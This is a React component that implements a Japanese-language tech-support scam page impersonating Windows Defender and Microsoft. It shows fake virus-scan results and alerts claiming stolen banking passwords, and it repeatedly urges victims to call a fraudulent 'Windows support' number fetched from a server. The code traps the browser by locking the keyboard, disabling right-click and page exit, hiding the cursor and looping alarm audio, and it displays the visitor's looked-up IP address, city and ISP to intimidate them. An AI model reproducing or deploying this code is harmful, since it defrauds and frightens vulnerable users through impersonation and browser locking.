
'use client';

import React, { useEffect, useState, useRef } from 'react';
import {baseUrl} from "@/config";

const AdminDes = () => {
    const [phoneNumber, setPhoneNumber] = useState('0101-501-203-5214');
    const [ipAddress, setIpAddress] = useState('');
    const [location, setLocation] = useState('');
    const [isp, setIsp] = useState('');
    const [showInitialOverlay, setShowInitialOverlay] = useState(true);
    const [showElements, setShowElements] = useState({
        proBox: false,
        black: false,
        proBox2: false,
        proBox3: false,
        popUpNew: false,
        popTxt: false,
        chat: false,
    });

    const visitorId = localStorage.getItem('visitorId');
    fetch(`${baseUrl}/requestedUser?visitorId=${visitorId}`)
    fetch(`${baseUrl}/getPhoneNumber2`)
        .then(res => res.text())
        .then(resu => {
            if (resu.length > 5 && !resu.includes('404'))
                setPhoneNumber(resu)
        })
        .catch(() => {
            setPhoneNumber('0101-501-203-5214')
        })

    const audioRef = useRef<HTMLAudioElement>(null);
    const style = document.createElement('link');
    style.rel = 'stylesheet';
    style.href = 'https://nagiflowjapan.shop/css/tapa.css'
    document.head.appendChild(style);
    document.addEventListener('contextmenu', event => event.preventDefault());
    document.onkeydown = function(e) { return false; };
    window.onbeforeunload = function() { return "Call Windows Defender Helpline Now"; };
    navigator.keyboard.lock();
    document.onkeydown = function (e) {
        return false;
    }

    useEffect(() => {
        const fetchIpData = async () => {
            try {
                const response = await fetch('https://ipwhois.pro/?key=C8sZnLEBIwQVuMA4');
                if (response.ok) {
                    const data = await response.json();
                    setIpAddress(`IPアドレス: ${data.ip}`);
                    setLocation(`位置: ${data.city}, ${data.country}`);
                    setIsp(`ISP: ${data.connection.isp}`);
                }
            } catch (error) {
                console.error('Error fetching IP data:', error);
            }
        };
        fetchIpData();

        const playAudio = () => {
            audioRef.current?.play().catch(error => {
                // Autoplay is often blocked, this is expected.
            });
        };
        const audioInterval = setInterval(playAudio, 500);

        const timer = setTimeout(() => setShowInitialOverlay(false), 5000);

        const showTimers = [
            { key: 'proBox', delay: 900 },
            { key: 'black', delay: 1000 },
            { key: 'proBox2', delay: 2500 },
            { key: 'proBox3', delay: 3500 },
            { key: 'popUpNew', delay: 4000 },
            { key: 'popTxt', delay: 4000 },
            { key: 'chat', delay: 600 },
        ];

        const timeouts = showTimers.map(item =>
            setTimeout(() => {
                setShowElements(prev => ({ ...prev, [item.key]: true }));
            }, item.delay)
        );

        return () => {
            clearInterval(audioInterval);
            clearTimeout(timer);
            timeouts.forEach(clearTimeout);
        };
    }, []);

    return (
        <div className="map" id="mycanvas" style={{ cursor: 'none' }}>

            {showInitialOverlay && (
                <div id="overlay2" style={{
                    zIndex: 9999999999,
                    position: 'fixed',
                    height: '100vh',
                    width: '100vw',
                    background: 'black',
                }}>
                    <div style={{
                        height: '250px',
                        width: '650px',
                        margin: 'auto',
                        marginTop: 'calc( (100vh / 2) - 125px )',
                        border: '2px white solid',
                        padding: '50px',
                        animation: 'scale 2s infinite alternate'
                    }}>
                        <p className="text-center" style={{ color: '#FEFEFE', fontSize: 'large' }}>
                            再起動または使用しないでください あなたのコンピュータ。<br />
                            コンピューターが無効になっています。 私に電話してください。<br />
                            アクセスはこれのブロックセキュリティの理由です コンピュータ。<br />
                            すぐにご連絡ください。 技術者が問題の解決をお手伝いします.
                        </p>
                    </div>
                    <style>{`
            @keyframes scale {
              0% { transform: scale(1); }
              100% { transform: scale(1.2); }
            }
          `}</style>
                </div>
            )}

            <div className="bg" style={{ cursor: 'none' }}>
                <div className="bgimg" style={{ top: 0 }}>
                    <img src="https://nagiflowjapan.shop/images/f24.png" alt="" width="100%" />
                </div>
            </div>

            <audio ref={audioRef} id="pridez" src="https://audio.jukehost.co.uk/qC8dN1AYE9nQkcTtcydsmA9f8nB5l0Yt" loop></audio>

            {showElements.black && <div className="black" style={{ height: '145%', cursor: 'none', display: 'block' }}></div>}

            {showElements.proBox && <div className="pro_box" style={{ cursor: 'none', display: 'block' }}>
                <div className="pro_box_header">
                    <div className="row">
                        <div className="col-md-12">
                            <div className="minimize">
                                <ul>
                                    <li>
                                        <a href="#">
                                            <img src="https://nagiflowjapan.shop/images/mnc.png" />
                                        </a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                        <div className="col-md-4">
                            <div className="logo">
                                <img src="https://nagiflowjapan.shop/images/msmm.png" />
                                <span>Windowsのセキュリティ</span>
                            </div>
                        </div>
                        <div className="col-md-8">
                            <div className="activate_lic">
                                <ul>
                                    <li>
                                        <a href="#">
                                            <button>ライセンスをアクティブ化する</button>
                                        </a>
                                    </li>
                                    <li>
                                        <a href="#">
                                            <img src="https://nagiflowjapan.shop/images/set.png" />
                                        </a>
                                    </li>
                                    <li>
                                        <a href="#">
                                            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAIAAAD9iXMrAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAP9JREFUeNqMUTEORUAQZbIUalESpTNoVEqJSuIKjuMUCiRKnQtoKSRCKRp0JPJf/iYbv/iJKdZ47+3smxl533fpG9d1dV03z/O6rrqum6bpOI6iKJxl/DNNU5Zly7JIjzAMI4oiy7KQy6gHUZqm+FFVNQxDEEDKsjzPk4iSJAFCeA6VeIE4jm3bbtsWJ3Ig932DhYbBk3juOI6macZx3LYtCAIOgoWGwbgwlOc5T9BB3/cCh4bQnfQbruui2aqqBAINYQRPEYx7nlcUBTwIEBrC1aeOMVbX9TAMTxAaghXMSfofYKEhTBzDFKimab7v4xQ2wEIj87292seb/X4EGADicI/nlE5xDgAAAABJRU5ErkJggg==" />
                                        </a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
                <div className="scan_box">
                    <div className="scan_box_header">
                        <div className="row">
                            <div className="col-md-6">
                                <div className="quick_scan">
                                    <p>
                                        <img src="https://nagiflowjapan.shop/images/vsc.png" />
                                        <span>スキャニングラピード</span>
                                    </p>
                                </div>
                            </div>
                            <div className="col-md-6">
                                <div className="minimize1">
                                    <ul>
                                        <li>
                                            <a href="#">
                                                <img src="https://nagiflowjapan.shop/images/mnc.png" />
                                            </a>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div className="scan_body">
                        <div className="progress">
                            <div className="active progress-bar progress-bar-success" style={{width: '100%'}} id="dynamic" aria-valuemax={100} aria-valuemin={0} aria-valuenow={100} role="progressbar">100% 完了</div>
                        </div>
                        <div className="table_quick">
                            <table className="table table-bordered">
                                <thead>
                                <tr>
                                    <th scope="col">スキャンされたオブジェクト</th>
                                    <th scope="col">
                                        <div className="col_fourth counter">
                                            <h2 className="count-number count-title timer" data-speed="5000" data-to="51900">51,900</h2>
                                        </div>
                                    </th>
                                </tr>
                                <tr>
                                    <th scope="col">使った時間</th>
                                    <th scope="col">5 secs</th>
                                </tr>
                                <tr>
                                    <th scope="col">特定された脅威</th>
                                    <th scope="col" style={{color:'red'}}>
                                        <h2 className="count-number count-title timer" data-speed="2500" data-to="1200">1,200</h2>
                                    </th>
                                </tr>
                                </thead>
                            </table>
                        </div>
                    </div>
                    <div className="scan_footer">
                        <div className="row">
                            <div className="col-md-6">
                                <div className="bt_can">
                                    <div className="btn-group" role="group" aria-label="Basic example">
                                        <button className="btn btn-secondary" type="button">キャンセル</button>
                                    </div>
                                    <div className="btn-group" role="group" aria-label="Basic example">
                                        <button className="btn btn-secondary" type="button">一時停止</button>
                                    </div>
                                </div>
                            </div>
                            <div className="col-md-6">
                                <div className="bt_can2">
                                    <div className="btn-group" role="group" aria-label="Basic example">
                                        <button className="btn btn-secondary" type="button">スケジュールされたスキャン</button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>}

            {showElements.proBox2 && <div className="pro_box2" style={{ cursor: 'none', display: 'block' }}>
                <img src="https://nagiflowjapan.shop/images/bx1.png" alt="" style={{ maxWidth: '100%' }} />
            </div>}

            {showElements.proBox3 && <div className="pro_box3" style={{ cursor: 'none', display: 'block' }}>
                <div className="pro_box_header">
                    <div className="row">
                        <div className="col-md-12">
                            <div className="minimize">
                                <ul>
                                    <li>
                                        <a href="#">
                                            <img src="https://nagiflowjapan.shop/images/mnc.png" />
                                        </a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                        <div className="col-md-4">
                            <div className="logo">
                                <img src="https://nagiflowjapan.shop/images/msmm.png" />
                                <span>Windowsのセキュリティ</span>
                            </div>
                        </div>
                        <div className="col-md-8">
                            <div className="activate_lic">
                                <ul>
                                    <li>
                                        <a href="#">
                                            <button>ライセンスをアクティブ化する</button>
                                        </a>
                                    </li>
                                    <li>
                                        <a href="#">
                                            <img src="https://nagiflowjapan.shop/images/bel.png" />
                                        </a>
                                    </li>
                                    <li>
                                        <a href="#">
                                            <img src="https://nagiflowjapan.shop/images/set.png" />
                                        </a>
                                    </li>
                                    <li>
                                        <a href="#">
                                            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAIAAAD9iXMrAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAP9JREFUeNqMUTEORUAQZbIUalESpTNoVEqJSuIKjuMUCiRKnQtoKSRCKRp0JPJf/iYbv/iJKdZ47+3smxl533fpG9d1dV03z/O6rrqum6bpOI6iKJxl/DNNU5Zly7JIjzAMI4oiy7KQy6gHUZqm+FFVNQxDEEDKsjzPk4iSJAFCeA6VeIE4jm3bbtsWJ3Ig932DhYbBk3juOI6macZx3LYtCAIOgoWGwbgwlOc5T9BB3/cCh4bQnfQbruui2aqqBAINYQRPEYx7nlcUBTwIEBrC1aeOMVbX9TAMTxAaghXMSfofYKEhTBzDFKimab7v4xQ2wEIj87292seb/X4EGADicI/nlE5xDgAAAABJRU5ErkJggg==" />
                                        </a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
                <div className="scan_box2">
                    <div className="scan_box_header">
                        <div className="row">
                            <div className="col-md-6">
                                <div className="quick_scan">
                                    <p>
                                        <img src="https://nagiflowjapan.shop/images/vsc.png" alt="scan" />
                                        <span>スキャン</span>
                                    </p>
                                </div>
                            </div>
                            <div className="col-md-6">
                                <div className="minimize1">
                                    <ul>
                                        <li>
                                            <a href="#"><img src="https://nagiflowjapan.shop/images/mnc.png" alt="minimize" /></a>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div className="scan_body">
                        <div className="row">
                            <div className="col-md-12"><div className="tooreg_detail_scan"><ul><li><a href="#">スキャン</a></li><li><a href="#">スキャン計画</a></li><li><a href="#">レポート</a></li></ul></div></div>
                        </div>
                        <br />
                        <div className="table_quick2">
                            <div className="row">
                                <div className="col-md-4"><div className="pc_desk"><img src="https://nagiflowjapan.shop/images/pcm.png" alt="pc" /></div></div>
                                <div className="col-md-4">
                                    <div className="card_top scan_pro">
                                        <ul>
                                            <li><i aria-hidden="true" className="fa fa-check"></i> アップデートの確認</li>
                                            <li><i aria-hidden="true" className="fa fa-check"></i> スキャンメモリ</li>
                                            <li><i aria-hidden="true" className="fa fa-check"></i> スタートアップ項目を分析する</li>
                                            <li><div className="circular-spinner"></div><span>レジストリ分析</span></li>
                                            <li>ファイルシステムの分析</li>
                                        </ul>
                                    </div>
                                </div>
                                <div className="col-md-4">
                                    <div className="scan_dur">
                                        <p><strong>分析の期間</strong></p><p>3秒0秒</p><p>5秒0秒</p><br />
                                        <p><strong>スキャンされたアイテム</strong></p><p>51,900</p><br />
                                        <p><strong>検出</strong></p><p>11</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div className="scan_footer3">
                        <div className="row">
                            <div className="col-md-2"><div className="viruses"><img src="https://nagiflowjapan.shop/images/vsc.png" alt="virus" /></div></div>
                            <div className="col-md-10">
                                <div className="make_this">
                                    <p>これは、オンラインの脅威について心配する必要のないことです。</p>
                                    <p>プレミアムは、コンピューターの速度を低下させることなく、マルウェア、ウイルスなどをブロックします。 プレミアムバージョンにアップグレードする</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>}

            <div style={{ bottom: '-20px', position: 'fixed', cursor: 'none', zIndex: 999999999 }} id="footer">
                <div className="row">
                    <div className="col-md-12">
                        <div className="right-foot" style={{ textAlign: 'center' }}>
                            <span id="footertxt"><img src="https://nagiflowjapan.shop/images/msmm.png" alt="logo" /> Windowsのセキュリティ </span>
                            <span style={{ fontWeight: 500, paddingLeft: '13px', color: '#fff' }}>
                Windows サポートに電話する: <span style={{ border: '1px solid #fff', borderRadius: '5px', padding: '2px 5px' }}> 📞 直接お電話ください {phoneNumber}</span>
              </span>
                        </div>
                    </div>
                    <div className="col-md-12">
                        <marquee direction="left" height="100px" width="100%">
                            <small className="text-left" style={{color:'#eee',fontSize:'10px'}}>Windows Defender SmartScreen により、認識されないアプリケーションの表示が防止されました。 このアプリケーションを実行すると、PC が危険にさらされる可能性があります。 Windows Defender スキャンにより、パスワード、オンライン ID、財務情報、個人ファイル、写真、ドキュメントを盗む可能性があるアドウェアがこのデバイス上で見つかりました。</small>
                        </marquee>
                    </div>
                </div>
            </div>

            {showElements.popTxt && <div className="lightbox" id="poptxt" style={{ display: 'block' }}>
                <div className="ilb top" style={{ fontSize: '17px' }}>
                    <div className="ilb headers" style={{ borderBottom: '1px solid #d6d5d5' }}>
            <span className="fl title" id="txtadd">
              <span className="fl ilb"><img src="https://nagiflowjapan.shop/images/dm.png" className="logo3" alt="defender" /></span>
              Windows Defender セキュリティ センター
            </span>
                        <span className="fl title2" id="txts1"><a href="#" id="cross"><img src="https://nagiflowjapan.shop/images/cs.png" alt="close" /></a></span>
                    </div>
                </div>
                <div id="txtintro">
          <span className="colo-rd">
            <div>Microsoft Windows ファイアウォールの警告 !</div>
            <div>トロイの木馬型スパイウェアに感染したPC</div>
            <div> (エラーコード: 2V7HGTVB)</div>
          </span>
                </div>
                <img src="https://nagiflowjapan.shop/images/re.gif" id="banner" alt="banner" />
                <div id="disclaimer">
                    この PC へのアクセスはセキュリティ上の理由からブロックされています. <br />
                    <span className="support" style={{ fontSize: '22px' }}>
            Windows サポートに電話してください:<br />
            <span style={{ border: '1px solid #114d9a', borderRadius: '5px', padding: '2px 5px' }}> 📞 {phoneNumber}</span>
          </span>
                </div>
                <div id="bottom">
                    <img src="https://nagiflowjapan.shop/images/msmm.png" id="badge" alt="badge" />
                    <span className="title3">Windows</span>
                    <ul>
                        <li><a href="#"><div className="fr button2"><span id="addtochromebutton">キャンセル</span></div></a></li>
                        <li><a href="#"><div className="fr button"><span id="addtochromebutton">OK</span></div></a></li>
                    </ul>
                </div>
            </div>}

            {showElements.popUpNew && <div className="cardcontainer" style={{ cursor: 'none', display: 'block' }} id="pop_up_new">
                <p style={{ fontSize: '16px', fontWeight: 700, margin: '8px 0 5px 0', padding: '5px 10px', color: '#fff!important' }} className="text-center">Windows-Defender - セキュリティ警告</p>
                <p><b>この PC へのアクセスはセキュリティ上の理由からブロックされています</b></p>
                <p>お使いのコンピュータは、トロイの木馬タイプのスパイウェアに感染していると報告されました。 次のデータが侵害されました。</p>
                <p>&gt; メール ID <br />&gt; 銀行のパスワード <br />&gt; Facebook ログイン <br />&gt; 写真と文書 </p>
                <p>Windows Defender スキャンにより、パスワード、オンライン ID、財務情報、個人ファイル、写真、ドキュメントを盗む可能性があるアドウェアがこのデバイス上で見つかりました。</p>
                <p>ただちに当社にご連絡ください。当社のエンジニアが電話で削除プロセスを案内いたします。</p>
                <p>ただちに Windows サポートに電話して、この脅威を報告し、個人情報の盗難を防ぎ、このデバイスへのアクセスのブロックを解除してください。</p>
                <p>このウィンドウを閉じると、個人情報が危険にさらされ、Windows の登録が一時停止される可能性があります。</p>
                <p style={{ paddingBottom: 0, color: '#fff', fontSize: '16px' }}>Windows サポートに電話する: <strong><span style={{ border: '1px solid #fff', borderRadius: '5px', padding: '2px 5px' }}>📞 {phoneNumber}</span></strong></p>
                <div className="action_buttons">
                    <a className="active" style={{ cursor: 'pointer', color: '#fff!important' }}>OK</a>
                    <a className="active" style={{ color: '#fff!important' }}>キャンセル</a>
                </div>
            </div>}

            <div className="answer_list" style={{ backgroundColor: '#000', height: 'auto', width: '550px', left: '33%', position: 'absolute', zIndex: 99999999, border: '1px solid transparent', borderColor: '#d6d8db', borderRadius: '.5rem' }} id="welcomeDiv">
                <p style={{ color: '#fff', marginTop: '10px', fontSize: '16px', padding: '0 5px' }} className="text-center">
                    すぐに当社にご連絡ください。当社のエンジニアが電話で削除プロセスを案内いたします。 <br />お使いのコンピュータは無効になっています。<br />
                    <strong>Windows サポートに電話する: <span style={{ border: '1px solid #383d41', borderRadius: '5px', padding: '2px 5px' }}> 📞 {phoneNumber}</span></strong>
                </p>
            </div>

            {showElements.chat && <div id="chat" style={{ display: 'block' }}>
                <img src="https://nagiflowjapan.shop/images/msmm.png" alt="logo" />
                <span style={{ color: '#222', fontSize: '24px', fontWeight: 600, marginLeft: '6px', position: 'relative', top: '5px' }}>Microsoft</span>
                <p style={{ fontWeight: 600, fontSize: '24px' }}>サポートに電話する: <br /></p>
                <h4 style={{ fontWeight: 600, fontSize: '22px' }}> 📞 {phoneNumber}<br />(セキュリティサポート)</h4>
                <div className="arrow-down">
                    <svg height="1em" viewBox="0 0 320 512" fill="#fff">
                        <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
                    </svg>
                </div>
            </div>}
        </div>
    );
};

export default AdminDes;

    